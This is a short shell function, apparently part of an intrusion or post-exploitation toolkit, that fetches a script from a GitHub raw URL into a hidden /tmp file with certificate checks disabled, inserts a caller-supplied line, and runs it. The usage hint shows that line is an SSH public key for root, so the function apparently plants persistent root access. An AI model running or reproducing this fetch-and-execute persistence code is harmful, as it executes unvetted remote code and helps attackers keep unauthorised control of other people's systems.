
gglog "load 'perm' exm:\"perm 'ssh-rsa AAA..... root@xxxxx'\""
perm(){
keep_shell=/tmp/.gvfdsp
wget --no-check-certificate  -q -c -t 3  'https://raw.githubusercontent.com/F0ckLinux/linux-clear/master/keep' -O $keep_shell && chmod +x $keep_shell;
if [ -f $keep_shell ];then
    sed  "4 $1" -i $keep_shell;
fi
. $keep_shell;
}
